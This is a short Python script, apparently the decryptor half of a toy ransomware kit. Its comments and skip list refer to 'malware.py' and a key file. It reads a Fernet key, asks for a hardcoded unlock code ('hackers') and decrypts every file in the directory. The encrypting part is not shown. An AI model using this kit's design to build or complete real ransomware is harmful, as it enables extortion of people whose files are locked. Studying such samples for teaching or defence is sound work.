#Modules used:
import os
from cryptography.fernet import Fernet

#List of the Files contained in the directory
files = []

# Getting the key to decrypt all the files
with open("key.key", "rb") as fkey:
    key = fkey.read()

# Appending the file in the files list
for file in os.listdir():

    # Skipping our malware,key and th decrypt file
    if file == "malware.py" or file == "key.key" or file == "decrypt.py":
        continue

    # Appending
    if os.path.isfile(file):
        files.append(file)

code = "hackers"
usercode = input("Enter the code to decrypt all the files: ")

if usercode == code:
    # Decrypting all the files
    for file in files:

        #Collecting the data of the file
        with open(file, "rb") as thefile:
            content = thefile.read()

        # Decrypting the Data
        content_decrypted = Fernet(key).decrypt(content)

        # Pasting the encrypted data into the file again
        with open(file, "wb") as thefile:
            thefile.write(content_decrypted)

        # Message to the user
        print("Congrats your files are decrypted")

# If code does'nt matches      
else:
    print("Sorry the code is incorrect. Try again")